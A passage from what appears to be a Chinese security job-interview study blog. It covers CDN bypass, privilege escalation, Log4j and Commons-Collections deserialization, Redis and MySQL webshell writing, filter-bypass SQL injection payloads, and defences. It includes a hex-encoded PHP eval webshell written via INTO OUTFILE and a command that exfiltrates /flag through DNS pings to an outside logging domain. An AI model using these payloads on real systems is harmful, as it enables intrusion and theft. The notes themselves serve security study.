title="CDN绕过"></a>CDN绕过</h4><p>1.通过多地ping判断是否存在cdn</p><p>2.一般子域名没有CDN加速,通过子域名获取真实ip</p><p>3.国内网站通过国外ping获取真实ip</p><p>4.历史DNS解析</p><p>5.通过icon利用网络空间搜索引擎查找</p><p>6.邮件系统寻找</p><p>7.信息泄露</p><p>8.如果直接ip不能访问,说明做了域名绑定</p><h4 id="linux-windows提权"><a href="#linux-windows提权" class="headerlink" title="linux/windows提权"></a>linux/windows提权</h4><p>1.linux提权:利用计划任务提权,suid提权,内核提权如脏牛提权</p><p>2.windows提权:利用最新漏洞,历史漏洞提权,用metasploit中的service_permissions模块</p><h4 id="浏览器输入一个url过程是什么样的，可能会产生哪些安全问题-https，中间人"><a href="#浏览器输入一个url过程是什么样的，可能会产生哪些安全问题-https，中间人" class="headerlink" title="浏览器输入一个url过程是什么样的，可能会产生哪些安全问题(https，中间人)"></a>浏览器输入一个url过程是什么样的，可能会产生哪些安全问题(https，中间人)</h4><p>浏览器在对一个url发起请求的过程:首先通过DNS解析对应的ip地址,通过三次握手与ip地址对应服务器建立TCP链接,建立连接后浏览器发送HTTP报文,服务器处理报文,做出响应,返回给浏览器资源,浏览器解析资源呈现给用户</p><p><strong>可能存在的安全问题</strong>http:在这个过程中都是暴露在互联网上的,我们可以随意截获浏览器发送的请求</p><p>使用HTTPS进行加密通信,可能存在中间人攻击,在建立https链接时服务器会向客户端返回公钥,这个时候中间人将这个公钥替换为自己的公钥即可控制两端的通信并且不会有所察觉,因为这个时候对于客户端和服务端来说她们都是在和中间人通信,这个时候就出现了证书来辅助验证公钥的合法性</p><h4 id="Log4j有关"><a href="#Log4j有关" class="headerlink" title="Log4j有关"></a>Log4j有关</h4><p>Log4j在处理不同日志等级的时候有不同的策略,在某些错误等级下会将带有${}的日志消息进行解析,payload形如XXXX:XXXXXX,底层原理是如果日志消息中存在形如${}的字符串,则取出中间的内容,并按照引号分割,引号左边则作为lookup类型,内置有11个lookup类,将其冒号右边的内容放入对应的lookup类进行执行,如jndi就会放入jndi的lookup类中,执行远程方法调用,此时伪造恶意远程服务器就可以造成反序列化漏洞从而RCE</p><h4 id="CC链有关"><a href="#CC链有关" class="headerlink" title="CC链有关"></a>CC链有关</h4><h5 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h5><p>1.CC1每个transformer的区别</p><p><strong>使用TransformedMap</strong></p><p>Transformer[]:存放触发链条的地方,一个存放transformer类型的数组</p><p>ConstantTransformer:在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回,起包装作用</p><p>InvokerTransformer:其实现的transform方法会通过反射调用任意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),<span class="comment">//将Runtime.getRuntime包装成为Transformer</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ChainedTransformer 将Transformer[]中的Transformer连在一起,实现了transform接口,将前一个回调的结果作为后一个回调的输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>TransformedMap,给map对象上回调,规定对新元素key或者value的回调,在被装饰的map对象调用set或者get方法时,触发transformerChain中的链式调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outherMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler:他的readobject方法中会遍历map并调用set方法设置新元素从而触发TransformedMap的回调transformerChain,并且他实现了Serializable接口,可以被序列化</p><p><strong>使用LazyMap</strong></p><p>TransformedMap利用的是AnnotationInvocationHandler在被反序列化时其readObject中存在给map新增元素的操作进而会触发回调transformerChain</p><p>而LazyMap利用的是LazyMap的get方法会调用transform,而AnnotationInvocationHandler中的invoke方法中会调用LazyMap的get方法,从而形成调用链,而要使得调用AnnotationInvocationHandler的invoke就得将我们构造的map对象使用AnnotationInvocationHandler进行代理,使AnnotationInvocationHandler成为我们构造的map的代理类,从而在执行代理类的任意方法时都会触发invoke方法从而触发反序列化</p><h5 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h5><p>和CC1一样,只是触发Lazymap#get的路线改变了,TiedMapEntry的hashCode方法调用了getValue方法,而getValue方法中调用了map#get方法,而我们让此map为Lazymap则就可以调用到Lazymap#get</p><p>而hashMap的readObject方法中存在hash方法,而hash方法又会触发TiedMapEntry的hashCode方法，HashMap可以被序列化,于是整条链子就出来了</p><h4 id="Struct执行流程"><a href="#Struct执行流程" class="headerlink" title="Struct执行流程"></a>Struct执行流程</h4><p>xxxxxxxxx</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>1.XXE外部实体注入,如果目标开启外部实体并且存在可控的输入并且没有做出足够的过滤的话就能是使用一些为协议进行探测,文件读取</p><p><strong>攻击类型:</strong></p><p>1.inband(带内):读取文件,带内容</p><p>2.oob:通过dtd访问远程文件将数据带出</p><p>3.在目标不能联网通过报错的形式,先带出数据,然后使其后面的语句报错</p><p>**防御:**禁用外部实体</p><h4 id="JNDI解析流程意义及原理"><a href="#JNDI解析流程意义及原理" class="headerlink" title="JNDI解析流程意义及原理"></a>JNDI解析流程意义及原理</h4><p>JNDI,将java对象以某个名称的形式绑定到一个容器环境当中,以后调用容器环境的查找(lookup)就可以查找出某个名称绑定的java对象了,它可以降低配置参数和代码的耦合性</p><h4 id="shiro判断密钥是否正确"><a href="#shiro判断密钥是否正确" class="headerlink" title="shiro判断密钥是否正确"></a>shiro判断密钥是否正确</h4><p>当key错误的时候,rememberMe字段的值是deleteMe</p><h4 id="PHP常见cms的方法调用方式"><a href="#PHP常见cms的方法调用方式" class="headerlink" title="PHP常见cms的方法调用方式"></a>PHP常见cms的方法调用方式</h4><p>1.MVC框架,如thinkphp,通过路由的形式调用,如:模块/控制器/方法/参数/参数值</p><p>2.通过传递参数的形式决定调用哪一个类,以及类中的方法</p><h4 id="Thinkphp5路由设计思路"><a href="#Thinkphp5路由设计思路" class="headerlink" title="Thinkphp5路由设计思路"></a>Thinkphp5路由设计思路</h4><p>默认路由1.模块/控制器/行为/参数/参数值</p><p>开启强制路由就需要定义自己的路由,不能随便访问</p><h4 id="介绍自己的工具-idea的dnslog插件-nmap扫描器-语义分析插件等"><a href="#介绍自己的工具-idea的dnslog插件-nmap扫描器-语义分析插件等" class="headerlink" title="介绍自己的工具(idea的dnslog插件,nmap扫描器,语义分析插件等)"></a>介绍自己的工具(idea的dnslog插件,nmap扫描器,语义分析插件等)</h4><p>1.我用使用idea插件开发配合dnslog平台实现了dnslog触发弹窗提醒功能</p><p>2.基于nmap实现了对内网进行扫描存活ip地址并根据需求存储,探测其端口,web服务的title等字段,完成自动化信息搜集</p><h4 id="拿到一份代码-如何下手"><a href="#拿到一份代码-如何下手" class="headerlink" title="拿到一份代码,如何下手"></a>拿到一份代码,如何下手</h4><p>1.首先搭建本地环境,搭建debug测试环境,构造测试数据方便测试</p><p>2.大致阅读代码,查看是不是使用基于框架开发,</p><p>3.读程序执行流程,php站点着重查看如何执行不同的方法,方法调用逻辑等</p><p>4.由功能点定位代码,先看敏感权限功能如涉及文件上传,文件下载,文件删除,执行sql语句更改用户权限名称等高权限操作,看是否存在漏洞</p><p>5.挖越权,一般涉及越权的都是高权限页面如管理员页面等,许多框架/cms会写一个基类包含鉴权的代码,然后在每个控制器中继承这个基类,着重看有没有漏写的,或者看基类中的鉴权逻辑是否有问题</p><p>6.使用forify扫一下,根据给出的警示人工筛选</p><p>7.以上工作全都完成就需要</p><h4 id="如何判断这个站是哪一个框架写的-有源码-无源码-审计基于框架开发的代码需要注意什么-在审计过程中和审计不带有框架的代码有什么区别-关注点上有什么不同"><a href="#如何判断这个站是哪一个框架写的-有源码-无源码-审计基于框架开发的代码需要注意什么-在审计过程中和审计不带有框架的代码有什么区别-关注点上有什么不同" class="headerlink" title="如何判断这个站是哪一个框架写的(有源码,无源码),审计基于框架开发的代码需要注意什么?在审计过程中和审计不带有框架的代码有什么区别?关注点上有什么不同?"></a>如何判断这个站是哪一个框架写的(有源码,无源码),审计基于框架开发的代码需要注意什么?在审计过程中和审计不带有框架的代码有什么区别?关注点上有什么不同?</h4><p>无源码:</p><p>1.直接在页面底部看</p><p>2.尝试访问站点不存在的路由,触发报错信息</p><p>3.通过响应头,cookie字段判断</p><p>4.看url,如果请求类似.do就可能用了struct中间件</p><p>有源码:</p><p>1.java,看用了那些包,依赖</p><p>2.php,看文件/方法结构</p><h4 id="反序列化开始-入手点"><a href="#反序列化开始-入手点" class="headerlink" title="反序列化开始,入手点"></a>反序列化开始,入手点</h4><p>1.魔法函数,destruct,wakeup,construct,tostring</p><p>2.cookie处反序列化</p><h4 id="利用内网机器请求内网服务"><a href="#利用内网机器请求内网服务" class="headerlink" title="利用内网机器请求内网服务"></a>利用内网机器请求内网服务</h4><h4 id="PHP代码常见入口函数怎么找"><a href="#PHP代码常见入口函数怎么找" class="headerlink" title="PHP代码常见入口函数怎么找?"></a>PHP代码常见入口函数怎么找?</h4><p>1.一般根目录index.php会调用入口函数</p><h4 id="PHP变量覆盖-php两个等号和三个等号的区别-底层回答"><a href="#PHP变量覆盖-php两个等号和三个等号的区别-底层回答" class="headerlink" title="PHP变量覆盖,php两个等号和三个等号的区别(底层回答)"></a>PHP变量覆盖,php两个等号和三个等号的区别(底层回答)</h4><p>1.变量覆盖,extract,可以将前面的变量值进行修改</p><p>2.在==和===的底层实现中,由于php弱类型的原因,==的底层实现进行了很多的判断,和数据类型的转换,这就出现0E会被解析为科学计数法(0),0x会被解析为十六进制,正是php自己进行数据类型转换的过程导致了弱类型相等的漏洞出现,而===的底层实现就简单很多,不去做类型转换,只有在两边操作数类型一样的时候才会进行判断,否则不会判断</p><h4 id="redis利用方式"><a href="#redis利用方式" class="headerlink" title="redis利用方式"></a>redis利用方式</h4><p>1.未授权访问,写shell,config set 目录;config set dbfilename 要写文件的目录,set x “”写入内容,save,写shell</p><p>2.主从复制,通过加载.so文件</p><h4 id="任意文件下载如何利用"><a href="#任意文件下载如何利用" class="headerlink" title="任意文件下载如何利用"></a>任意文件下载如何利用</h4><p>1.下源码,审计漏洞</p><p>2.下数据库配置文件,尝试远程链接</p><p>3.下载敏感文件,信息搜集</p><h4 id="REC不出网-利用思路"><a href="#REC不出网-利用思路" class="headerlink" title="REC不出网,利用思路"></a>REC不出网,利用思路</h4><h4 id="判断对应目标用了什么数据库"><a href="#判断对应目标用了什么数据库" class="headerlink" title="判断对应目标用了什么数据库"></a>判断对应目标用了什么数据库</h4><p>1.通过sql报错来看</p><p>2.有源码或者任意文件下载拿到源码的话查看配置文件看查询语句,数据库配置文件等</p><h4 id="防止重放攻击"><a href="#防止重放攻击" class="headerlink" title="防止重放攻击"></a>防止重放攻击</h4><p>1.将时间戳进行加密</p><p>2.将接收到的参数进行hash,比对60秒内同以用户的hash是否一致</p><h4 id="JWT令牌"><a href="#JWT令牌" class="headerlink" title="JWT令牌"></a>JWT令牌</h4><p>1.头部-&gt;负载-&gt;签名组成,服务器每次将头部和负载拼接的结果按照自己的密钥加密放在第三部分(签名组成)</p><p>2.jwt伪造,如果通过各种途径泄露了jwt令牌密钥,或者密钥不长使用jwtcreacker,那么就能够利用密钥给自己签名,伪造jwt数据欺骗服务器</p><h4 id="AJAX发送POST发送几个数据包"><a href="#AJAX发送POST发送几个数据包" class="headerlink" title="AJAX发送POST发送几个数据包?"></a>AJAX发送POST发送几个数据包?</h4><p>1.2个数据包,一个装载头信息,一个装载POST正文</p><h4 id="AJAX如何发送post请求"><a href="#AJAX如何发送post请求" class="headerlink" title="AJAX如何发送post请求"></a>AJAX如何发送post请求</h4><p>1.创建异步对象xmlhttp</p><p>2.设置请求方式和地址</p><p>3.发送请求(如果是表单数据,需要使用setRequestsHeader添加HTTP头)</p><p>4.监听状态变化</p><p>5.处理返回结果</p><h4 id="自动化代码分析fortify-seay等-使用过吗-原理是什么"><a href="#自动化代码分析fortify-seay等-使用过吗-原理是什么" class="headerlink" title="自动化代码分析fortify,seay等,使用过吗,原理是什么?"></a>自动化代码分析fortify,seay等,使用过吗,原理是什么?</h4><p>1.使用过,fority是将代码统一为一种中间格式的语言代码,然后通过静态分析分析这种中间格式的语言代码从而分析其执行逻辑找出可能存在漏洞的地方</p><p>2.seay检测敏感函数</p><h4 id="windows横向移动"><a href="#windows横向移动" class="headerlink" title="windows横向移动"></a>windows横向移动</h4><h4 id="站库分离如何拿webshell"><a href="#站库分离如何拿webshell" class="headerlink" title="站库分离如何拿webshell"></a>站库分离如何拿webshell</h4><p>1.找其他入口点,文件上传等</p><h4 id="linux-windows命令-过滤文件-查看进程环境变量-看进程pid"><a href="#linux-windows命令-过滤文件-查看进程环境变量-看进程pid" class="headerlink" title="linux,windows命令:过滤文件,查看进程环境变量,看进程pid"></a>linux,windows命令:过滤文件,查看进程环境变量,看进程pid</h4><p>linux:</p><p>查进程:ps -aux | grep 进程名</p><p>-a 显示终端下执行的进程</p><p>-u 显示用户相关的进程</p><p>-x 显示所有进程</p><p>查端口:</p><p>lsof -i:xxx</p><p>查文件:</p><p>find 目录 / -name 文件名</p><p>查进程环境变量:</p><p>查进程号,然后</p><p>cat/proc/environ</p><p>windows:</p><p>查进程</p><p>netstat -ano</p><p>a:端口</p><p>n:显示地址和端口号</p><p>o:显示pid</p><p>查端口</p><p>netstat -ano | findstr xxx</p><p>杀进程</p><p>taskkill -pid</p><h4 id="Python多线程-python多线程锁"><a href="#Python多线程-python多线程锁" class="headerlink" title="Python多线程,python多线程锁"></a>Python多线程,python多线程锁</h4><p>1.GLI锁会影响多线程性能</p><p>2.多进程multiprocessing</p><h4 id="如何检测webshell"><a href="#如何检测webshell" class="headerlink" title="如何检测webshell"></a>如何检测webshell</h4><p>1.检测敏感函数</p><p>2.通过访问量进行筛查</p><p>3.请求UA单一</p><p>4.访问时间在非工作时间</p><p>动态沙箱检测</p><h4 id="webshell检测绕过"><a href="#webshell检测绕过" class="headerlink" title="webshell检测绕过"></a>webshell检测绕过</h4><p>1.HIDS文件内容缓存绕过，文件名hash碰撞</p><p>2.PHP旧版本中preg类函数如preg_replace存在修饰符e，会将替换后的结果放入eval函数执行,</p><p>preg_replace函数的第一个参数支持传入字符串或者数组，传入数组可绕过引擎检测</p><p>php底层对第一个参数的处理是跳过对\n，空格，这两个字符的判断的，我们可以构造preg_replace(‘\n\n\ne\n\n\n’,’\0’,$shell)来绕过引擎</p><h4 id="攻击溯源思路"><a href="#攻击溯源思路" class="headerlink" title="攻击溯源思路"></a>攻击溯源思路</h4><h4 id="DNS协议安全问题"><a href="#DNS协议安全问题" class="headerlink" title="DNS协议安全问题"></a>DNS协议安全问题</h4><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>简单请求：向服务器发起请求，加上origin给服务器检查，服务器返回cors头给浏览器，浏览器检查cors头，如果包含了当前的一个源则放行，否则拦截</p><p>复杂请求：在进行简单请求的基础上发起真正请求，返回数据</p><h4 id="遇到过比较难的CTF题目"><a href="#遇到过比较难的CTF题目" class="headerlink" title="遇到过比较难的CTF题目"></a>遇到过比较难的CTF题目</h4><p>1.线下题目,go语言,有一个文件上传结构,拿到源码审计后发现有一个参数可以可控环境变量,文件上传满5个使用curl命令请求另外一个端口的服务清楚文件夹内容,直接想到了LD_PRELOAD劫持动态链接库劫持curl命令</p><p>2.HTTP请求走私,利用gunicorn 请求走私,前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</p><p>CL不为0,CL-CL(两个cl),CL-TE(后端忽略cl,处理TE),TE-CL(前端TE,后端CL),TE-TE(都是TE,但是可能容错性不一样)</p><h4 id="CTF经历："><a href="#CTF经历：" class="headerlink" title="CTF经历："></a>CTF经历：</h4><p>最开始就通过打一些难度不是特别大的比赛hackgame，新生赛，BUUCTF办的比赛来培养兴趣，对网络安全有了一定的认知后开始尝试打一打国外的比赛以及国内的大比赛像湖湘，强网，王鼎，全国大学生，战队办的N1CTF,D3CTF等，国内企业办的pwnhub，虽然不一定能做出来很多题，但是每次都会有提升，会学到新的trick</p><h4 id="分享trick"><a href="#分享trick" class="headerlink" title="分享trick"></a>分享trick</h4><p>P牛：环境变量注入，在centenos下由于控制ENV $()可执行命令的问题，利用BASH_FUNC_XXX%%创建函数然后执行bash -c 执行xxx函数，导致直接命令执行</p><p>环境变量WGETRC可指定wget</p><p>环境变量ld_preload</p><p>构造出错的压缩包</p><h2 id="sql注入基础类"><a href="#sql注入基础类" class="headerlink" title="sql注入基础类:"></a>sql注入基础类:</h2><h4 id="mysql8新特性table-value"><a href="#mysql8新特性table-value" class="headerlink" title="mysql8新特性table/value"></a>mysql8新特性table/value</h4><p>table绕过select过滤,table不支持where字句</p><p>values</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=0 union <span class="keyword">values</span> <span class="keyword">row</span>(<span class="keyword">database</span>())</span><br><span class="line"><span class="number">0</span> ||(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">#字段数</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag&#x27;</span>))<span class="comment">#读文件</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">0x3c3f706870</span> <span class="number">406576616</span>c28245f504f53545b315d293b3f3e)</span><br><span class="line"> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span><span class="comment">#写shell</span></span><br><span class="line"> (<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) &lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>);<span class="comment">#盲注</span></span><br></pre></td></tr></table></figure><h4 id="sql注入爆库-表-字段"><a href="#sql注入爆库-表-字段" class="headerlink" title="sql注入爆库,表,字段"></a>sql注入爆库,表,字段</h4><p>information_schema存储了库.表,字段</p><p>如果被BAN了,在MYSQL5.7中</p><p>如果有自增ID,则使用视图sys.schema_auto_increment_columns</p><p>如果没有自增ID,使用schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer(I/O延迟时间)</p><p>如果开启innodb引擎,可以通过 mysql.innodb_table_stats,mysql_innodb_table_index,默认不开</p><p>通过无列名注入注字段,join</p><h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h4><p>sql注入是代码在与数据库交互的过程中执行的sql语句中存在用户可控的字段,输入恶意内容即可闭合原有sql语句和产生新的sql语义,导致恶意用户可以直接控制执行的sql语句从而造成注入</p><h4 id="dnslog外带数据"><a href="#dnslog外带数据" class="headerlink" title="dnslog外带数据"></a>dnslog外带数据</h4><p>Mysql:loadfile函数,只能用于windows系统,secure_file_priv=””,因为windows系统支持UNC路径,带出时使用hex编码,确保dns正常解析</p><h4 id="dnslog原理"><a href="#dnslog原理" class="headerlink" title="dnslog原理"></a>dnslog原理</h4><p>dnslog是存储在DNS服务器上的域名信息，记录着对域名的访问信息，也就是说我们对a.com这个域名的请求信息会被记录，此时我们将参数拼接到三级域名上，b.a.com，你那么就会记录下这次dns解析请求，从而带出数据</p><p>在不一样的环境下利用不同方法带出数据</p><p>命令执行：</p><p>| 管道：上一条命令的结果作为吓一跳命令的输入</p><p>|| 上一条命令失败后执行</p><p>&amp; 后台运行</p><p>&amp;&amp; 上一条命令成功后执行</p><p>a=`cat /flag | base32` &amp;&amp; b=${a//=/} &amp;&amp; echo &amp;&amp;ping $b.1232a822.toxiclog.xyz</p><p>java环境：</p><p>sys:java.verison</p><p>sys:user.dir</p><p>java:os</p><p>env:HOSTNAME</p><p>windows环境</p><p>%COMPUTERNAME%</p><p>%OS%</p><p>%USERNAME%</p><p>等</p><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><p>1.预编译:预编译的原理:一个正常的sql语句执行流程是:被mysql解析为语法树,预处理器验证语法树,然后执行,在传入参数的过程中sql语句已经被解析为语法树了,无论输入和等数据,语法树不会再变化,从而杜绝sql注入的发生</p><p>2.不当使用可能会造成注入,没有按照参数绑定来进行预编译</p><p>3.表明,列名不能被预编译,预处理器在检查生成的语法树时会检查表是否存在,所以表名,列名不能作为占位符</p><p>4.order By后的数据和排序方式ASE/DESC也不能被预编译</p><h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>1.过滤关键字,敏感数据</p><h5 id="对返回的值进行过滤"><a href="#对返回的值进行过滤" class="headerlink" title="对返回的值进行过滤"></a>对返回的值进行过滤</h5><p>1.在返回数据时进行过滤,即使出现sql注入也能防止回显,保证数据不被窃取</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>1.在一个站点的某处sql处向数据库插入了恶意语句,即便语句被转义</p><p>2.站点在其他地方调用该处数据时没有将取出的数据做判断直接拼接使用,造成注入</p><p>防御:1.从数据库中取出数据时仍然需要进行转义,不能轻易相信</p><h4 id="遇到order-by怎么防御"><a href="#遇到order-by怎么防御" class="headerlink" title="遇到order by怎么防御"></a>遇到order by怎么防御</h4><p>白名单,只允许白名单中的字段进入order by后的字段</p><h4 id="转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办"><a href="#转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办" class="headerlink" title="转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办"></a>转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办</h4><p>用占位符先占位,等完成拼接并转义后在替换回去</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>两个字节的字符就是宽字节,输入特殊字符的时候被转义函数转义,出现%5C(转义符),由于mysql各层的字符集设置不相同,导致在取出数据的时候用新的字符集去解析,将原本的转义符编码和其他字符编码组合形成两个字节的编码形成宽字节进行解析(%df%5c就是汉字運),从而绕过转义符的判断</p><p>使用mysql_set_charset指定字符集，同时使用mysql_real_escape_string对其进行转移转义,可以避免字符集不相同导致的%df和%5c发生拼接冲突的问题</p><h4 id="过滤””怎么办"><a href="#过滤””怎么办" class="headerlink" title="过滤””怎么办"></a>过滤””怎么办</h4><p>1.宽字节注入绕过</p><p>2.16进制编码，查询的数据是16进制的话不用使用引号引起来</p><h4 id="过滤空格怎么办"><a href="#过滤空格怎么办" class="headerlink" title="过滤空格怎么办"></a>过滤空格怎么办</h4><p>1.多行注释/**/绕过</p><p>2.%09(tab)</p><p>3.()绕过</p><p>4.回车%0a,%0d绕过</p><p>5./*!….*/内敛注释绕过</p><h4 id="过滤-怎么办"><a href="#过滤-怎么办" class="headerlink" title="过滤=怎么办"></a>过滤=怎么办</h4><p>1.like,rlike代替等号</p><p>2.regexp正则比较</p><p>3.&lt;&gt;等价于!=，所以!(&lt;&gt;)即可代表=</p><h4 id="过滤or-and怎么办"><a href="#过滤or-and怎么办" class="headerlink" title="过滤or/and怎么办"></a>过滤or/and怎么办</h4><p>1.and &amp;&amp;</p><p>2.or ||</p><p>3.not !</p><p>4.xor |</p><h4 id="过滤union-select等关键字怎么办"><a href="#过滤union-select等关键字怎么办" class="headerlink" title="过滤union,select等关键字怎么办"></a>过滤union,select等关键字怎么办</h4><p>1.双写</p><p>2,大小写</p><p>3.url编码绕过</p><h4 id="过滤-怎么办-1"><a href="#过滤-怎么办-1" class="headerlink" title="过滤,怎么办"></a>过滤,怎么办</h4><p>1.在substr(“string”,1,3)逗号使用中使用 ”被截取字符串“from 1 for 3</p><p>2.在limit中的limit 0,3使用offset绕过,limit 3 offset 0</p><h4 id="过滤查询关键字怎么办如select-from-xxx-where-username-“admin”过滤了admin"><a href="#过滤查询关键字怎么办如select-from-xxx-where-username-“admin”过滤了admin" class="headerlink" title="过滤查询关键字怎么办如select * from xxx where username = “admin”过滤了admin"></a>过滤查询关键字怎么办如select * from xxx where username = “admin”过滤了admin</h4><p>1.十六进制绕过</p><h4 id="时间盲注ban了sleep怎么办"><a href="#时间盲注ban了sleep怎么办" class="headerlink" title="时间盲注ban了sleep怎么办"></a>时间盲注ban了sleep怎么办</h4><p>1.执行时间耗时较大的运算如benchmark，计算两个很大的数据库的笛卡尔积</p><h4 id="过滤了substr-怎么办"><a href="#过滤了substr-怎么办" class="headerlink" title="过滤了substr()怎么办"></a>过滤了substr()怎么办</h4><p>1.LPAD(str,len,padstr)</p><p>2.MID()</p><h4 id="盲注除了时间-bool还有什么方法"><a href="#盲注除了时间-bool还有什么方法" class="headerlink" title="盲注除了时间,bool还有什么方法"></a>盲注除了时间,bool还有什么方法</h4><p>1.regexp盲注</p><h4 id="mysql写webshell的原理是什么-写shell的前提是什么"><a href="#mysql写webshell的原理是什么-写shell的前提是什么" class="headerlink" title="mysql写webshell的原理是什么,写shell的前提是什么?"></a>mysql写webshell的原理是什么,写shell的前提是什么?</h4><p>1.mysql的load_file函数可以将查询结果写入文件，前提是mysql用户必须拥有FILE权限，并且secure_file_priv为空，或路径为web路径</p><p>2.mysql写日志，打开日志记录-&gt;修改日志保存文件为web目录-&gt;执行带有shell的命令-&gt;getshell</p><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>1.UDF提权利用mysql的用户自定义函数时使用SONAME关键字加载.so文件，so文件中定义一个和mysql中的同名函数并实现命令执行代码，mysql便可以通过自定义函数执行任意命令，如果mysql是以ROOT用户启动的，那么就可以使用ROOT权限执行命令达到提权的作用</p><h2 id="协议类"><a href="#协议类" class="headerlink" title="协议类:"></a>协议类:</h2><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><p>ICMP协议是一个网络层协议,和IP协议同层,确认IP包是否到达指定ip,返回错误信息</p><h4 id="ARP协议-ARP欺骗"><a href="#ARP协议-ARP欺骗" class="headerlink" title="ARP协议/ARP欺骗:"></a>ARP协议/ARP欺骗:</h4><p>arp协议用来解析地址,他会通过在本地缓存查找,如果没有会继续在局域网内进行广播从查找对应ip地址主机的对应mac地址</p><p>由于arp协议是以广播的形式发送的,局域网内的其他主机可以自主应答ARP协议的消息,这个时候恶意主机就可以恶意的应答一些消息,使错误的ip地址与mac地址的关系存入发送arp请求的arp本地缓存当中,造成欺骗</p><p>原来的请求过程是PC1-&gt;网关-&gt;互联网,然后pc2进行arp欺骗,在pc1进行更新本地arp缓存的时候发送应答将pc2的mac地址发送给pc1,建立错误的arp表关系,以后PC1再次访问网关就会被重定向到PC2处,PC1的所有流量丢都会被PC2所劫持</p><h4 id="ARP欺骗防范"><a href="#ARP欺骗防范" class="headerlink" title="ARP欺骗防范"></a>ARP欺骗防范</h4><p>1.防火墙监控</p><p>2.静态ARP表</p><p>3.使用代理</p><h4 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h4><p>OSI七层网络模型</p><p>物理层-&gt;数据链路层-&gt;网络层-&gt;传输层-&gt;会话层-&gt;表示层-&gt;应用层</p><h4 id="TCP-IP握手"><a href="#TCP-IP握手" class="headerlink" title="TCP/IP握手"></a>TCP/IP握手</h4><p>三次握手</p><p>1.客户端发起SYN</p><p>2.服务端返回SYN+ACK表示确认收到了,ACK+1,表示一次确认</p><p>3.客户端再次返回给服务端ACK,此时ACK+1,表示二次确认</p><p>四次挥手</p><p>1.客户端发出FIN请求断开连接,附带seq字段表示本次数据序列</p><p>2.服务器回复ack表示已经收到数据,ACK表示以正确收到断开连接请求</p><p>3.服务器回复客户端seq表示本次数据序列号,同时回复FIN请求表示没有数据需要发给客户端了,请求断开链接</p><p>4.客户端回复ack确认收到对应序列号的数据了,客户端回复ACK表示正确收到服务器发送的断开链接请求</p><h4 id="UDP"><a href="#UDP" class="headerlink" 